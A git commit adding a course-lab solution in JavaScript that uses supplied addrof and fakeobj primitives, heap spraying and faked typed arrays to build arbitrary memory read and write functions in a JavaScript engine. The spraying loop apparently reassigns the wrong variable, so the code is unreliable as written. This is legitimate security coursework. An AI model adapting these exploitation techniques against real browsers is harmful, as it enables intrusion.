8ad9b408b9a319e037b0878e7f937fafe8633fcc
Denis Ivanov <denis.ivanov26@gmail.com>
2022-04-09 19:09:11 -0500

    Update partb.js

--- proj5/partb.js
+++ proj5/partb.js
@@ -1,3 +1,48 @@
 /*
  * TODO: Part B solution goes here!
  */
+
+let dataPlane = new Uint32Array(1);
+let toy = "\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00";
+let fakedStr = cs361s.fakestr(cs361s.addrof(toy) + 16);
+
+// use heap spraying to find the address of a typed array in range of fakedstr length
+let heapArray = new Uint32Array(72);
+while (cs361s.addrof(heapArray) < cs361s.addrof(fakedStr) || cs361s.addrof(fakedStr) - 56 + (2 ** 28) < cs361s.addrof(heapArray)) {
+    array = new Uint32Array(72);
+}
+
+let offset = cs361s.addrof(heapArray) - (cs361s.addrof(fakedStr) + 16);
+let bytes = new Uint8Array(72);
+for (let i = 0; i < 72; i++) {
+    bytes[i] = fakedStr.charCodeAt(offset + i);
+}
+
+// write the bytes we want into the data plane
+for (let i = 0; i < 8; i++) {
+    let byte = cs361s.addrof(dataPlane);
+    for (let j = 0; j < i; j++) {
+        byte = byte - bytes[56 + j];
+        byte = byte / 256;
+    }
+    bytes[56 + i] = byte % 256;
+}
+
+// create the control plane
+bytes[0] = bytes[0] + 1;
+let cBuf = String.fromCharCode(...bytes);
+let controlPlane = cs361s.fakeobj(cs361s.addrof(cBuf) + 16);
+
+let fourWordBytes = 2 ** 32;
+
+let readmem = function(addr) {
+    controlPlane[14] = addr % fourWordBytes;
+    controlPlane[15] = (addr - controlPlane[0]) / fourWordBytes;
+    return dataPlane[0];
+};
+
+let writemem = function(addr, val) {
+    controlPlane[14] = addr % fourWordBytes;
+    controlPlane[15] = (addr - controlPlane[0]) / fourWordBytes;
+    dataPlane[0] = val;
+};
